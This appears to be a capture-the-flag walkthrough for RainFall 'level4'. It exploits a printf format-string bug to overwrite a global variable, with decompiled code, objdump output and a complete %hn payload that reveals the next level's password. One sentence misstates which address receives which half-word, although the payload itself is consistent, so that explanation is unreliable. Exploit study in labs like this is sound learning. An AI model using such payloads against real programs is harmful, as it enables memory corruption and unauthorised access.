# Level4
Level4 is about going further on global variables and formatted strings exploits

# Tools

# Walkthrough
The home of level4 contains binary, as usual.

Upon decompiling it with dogbolt, we see an interesting function:
```c
void n()
{
    char v0;  // [bp-0x20c]

    fgets(&v0, 0x200, __bss_start);
    p(&v0);
    if (m == 16930116)
    {
        system("/bin/cat /home/user/level5/.pass");
        return;
    }
    return;
}
```

The goal of this exercice seemsp pretty similar to the goal of the previous exercice.
THe core difference here lies in the number compared to `m`. 
`16930116` is too big of a number to only be written on 2-bytes (also called 'word'), and writing 4 bytes (called 'double word' or 'dword' for short) in a signe shot can be risky.

We want to find the address of `m` (it's a global variable):
```bash
objdump -t level4
...
08049810 g     O .bss	00000004              m
...
```

The function `n` calls function `p`, which contains a vulnerable `printf` call:
```c
int __cdecl p(char *format)
{
  return printf(format);
}
```

We want to exploit that code to overwrite the value of `m` to get in the `if` segment. 

First, we need to know where we are the memory when abusing the `printf`. With trial and error:
```
level4@RainFall:~$ ./level4 <<< $(python -c 'print "AAAA" + "%12$x "')
AAAA41414141
```
So we start overwriting after 11 double words, at dword 12. 

`16930116` = `0x01025544`
As discussed earlier, it's too big of a number to fit on 2 bytes, even in hexadecimal.
Thus, we split it in two parts:
`0x0102`= `258` and `0x5544` = `21828`

Because of the little-endianness, we want to write the low value bytes in the lower memory addresses. Thus, `258` will be written at `0x08049810` (address of `m`), and `21828` at `0x08049812`(address of `m` + 2 (bytes we have written previously)).

Addresses in little endian:
`"\x12\x98\x04\x08" + "\x10\x98\x04\x08"`
Writting a value using `hn` (int on only 2 bytes) and padding:
`"%(258 - 8)d" + "%12$hn" + "%(21828 - 258)d" + "%13$hn"`

Giving the payload:
`"\x12\x98\x04\x08\x10\x98\x04\x08%250d%12$hn%21570d%13$hn"`

Start the programme with the payload:
```bash
python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08%250d%12$hn%21570d%13$hn"' > attack.txt; cat attack.txt - | ./level4
```

# Resources
